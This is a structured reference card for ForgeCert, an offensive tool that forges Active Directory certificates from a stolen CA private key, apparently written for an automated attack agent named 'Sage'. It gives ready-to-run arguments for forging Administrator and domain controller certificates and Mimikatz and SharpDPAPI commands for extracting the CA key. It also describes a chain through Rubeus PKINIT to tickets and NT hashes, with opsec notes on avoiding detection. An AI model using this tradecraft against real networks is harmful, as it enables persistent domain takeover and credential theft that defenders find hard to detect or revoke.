---
name: ForgeCert
category: adcs
subcategories: [certificate-forgery, ca-private-key, golden-certificate]
tradecraft_tags: [adcs, certificate, forgery, ca-key, golden-cert, specterops]
mitre_attack:
  - id: T1649
    name: Steal or Forge Authentication Certificates
source:
  url: https://github.com/GhostPack/ForgeCert
  license: BSD-3-Clause
  maintained: true
binary_type: .net-assembly
binary_filename: ForgeCert.exe
supported_os: [windows]
architecture: [x64]
privilege_required: local-admin
network_required: false
detection_signal: |
  ForgeCert itself operates offline — it reads a CA certificate+private key file
  and produces a forged certificate. The detection signal is at the CA private key
  *acquisition* step (DPAPI decryption of CA key material, accessing CA database)
  which typically requires elevated access to the CA host. Forged certificate use
  (PKINIT authentication) is hard to distinguish from legitimate certificate-based auth.
usage_examples:
  - description: Forge a certificate for a domain admin using stolen CA key
    args: "--CaCertPath ca.pfx --CaCertPassword '' --Subject 'CN=Administrator' --SubjectAltName administrator@north.sevenkingdoms.local --NewCertPath admin.pfx --NewCertPassword 'P@ss123!'"
  - description: Forge for a computer account
    args: "--CaCertPath ca.pfx --CaCertPassword '' --Subject 'CN=DC01' --SubjectAltName DC01$@north.sevenkingdoms.local --NewCertPath dc01.pfx --NewCertPassword 'pass'"
opsec_notes: |
  ForgeCert requires the CA's private key — which lives on the CA server and is protected
  by DPAPI with machine key context (requires admin/SYSTEM on CA). Obtaining the CA key
  is the hardest and noisiest step. Once you have it, ForgeCert runs offline (no network,
  no logs). The forged certificate, when used for PKINIT (Rubeus), is indistinguishable
  from a legitimately issued certificate. The CA can't revoke what it doesn't know about.
gotchas: |
  Getting the CA private key requires: (1) SYSTEM on the CA machine, (2) DPAPI decryption
  with SharpDPAPI/mimikatz. The CA key is under HKLM DPAPI (machine-level). After obtaining
  the key, ForgeCert runs entirely offline. The forged certificate has a validity period
  you choose — set it to a reasonable window to avoid obvious artifacts. Forged certs
  contain no template OID — some strict checking environments may reject certs without
  recognized template metadata.
related_ttps: [certify, rubeus, pkinittools, passthecert, sharpdpapi]
alternatives: [certipy-forge, openssl-with-ca-key]
common_args:
  --CaCertPath:
    description: Path to CA certificate PFX file (with private key)
    typical_values: ["ca.pfx"]
    required: true
  --CaCertPassword:
    description: Password for CA PFX (empty string if no password)
    typical_values: ["''", "Password123"]
    required: true
  --Subject:
    description: Subject DN for the forged certificate
    typical_values: ["CN=Administrator"]
    required: true
  --SubjectAltName:
    description: UPN in Subject Alternative Name (for PKINIT authentication)
    typical_values: ["administrator@domain.local", "DA@north.sevenkingdoms.local"]
    required: true
  --NewCertPath:
    description: Output PFX path for the forged certificate
    typical_values: ["admin.pfx"]
    required: true
  --NewCertPassword:
    description: Password for the output PFX
    typical_values: ["P@ss123!"]
    required: true
last_updated: 2026-05-29
---

# ForgeCert

GhostPack's "Golden Certificate" tool. Given a CA's certificate with its private key,
ForgeCert forges arbitrary certificates for any principal in the domain — creating
certificates that the CA theoretically issued but has no record of. The forged certificate
can be used with Rubeus PKINIT to authenticate as any domain account, including DA or
krbtgt. This is the offline equivalent of ESC1/ESC3 — it bypasses enrollment checks
entirely once you have the CA key.

## Typical use cases
- Forge certificates for domain accounts after compromising the CA host
- Create a "Golden Certificate" (persistent auth mechanism that survives password changes)
- Authenticate as any account using PKINIT without any AD interaction during forgery

## How Sage uses this
ForgeCert is an escalation step after CA host compromise. The chain:
1. Gain SYSTEM on CA host → SharpDPAPI to extract CA private key
2. ForgeCert (offline, no network) → forge certificate for DA or krbtgt
3. Rubeus asktgt with forged certificate → TGT for target account
4. Rubeus /getcredentials → NT hash without offline cracking

The "Golden Certificate" pattern allows persistent domain access that survives even
password changes (unlike golden tickets, the forged cert doesn't depend on krbtgt hash).

## Output
A PFX file containing the forged certificate and private key. Feed directly to
Rubeus `--certificate:` for PKINIT authentication.

## Full Reference

> Captured against ForgeCert v1.0.0, 2026-05-29. Source: https://github.com/GhostPack/ForgeCert README.

### Argument listing

| Arg | Description |
|-----|-------------|
| `--CaCertPath X` | Path to CA PFX file (certificate + private key) |
| `--CaCertPassword X` | Password for CA PFX (use `''` for no password) |
| `--Subject X` | Certificate subject (CN=Administrator) |
| `--SubjectAltName X` | UPN in SAN extension (administrator@domain) |
| `--NewCertPath X` | Output forged certificate PFX path |
| `--NewCertPassword X` | Password for output PFX |
| `--CrlDistributionPoint X` | Optional CRL distribution point URL |
| `--ValidityYears X` | Validity in years (default: 1) |

### Obtaining the CA private key (prerequisite)

```
# With SharpDPAPI (from CA host, SYSTEM/DA level):
SharpDPAPI.exe certificates /machine

# With Mimikatz:
privilege::debug
crypto::capi
crypto::certificates /systemstore:local_machine /store:my /export
```

### Source for this reference

- https://github.com/GhostPack/ForgeCert (README)
- SpecterOps blog: https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d
- Version: v1.0.0 as of 2026-05-29
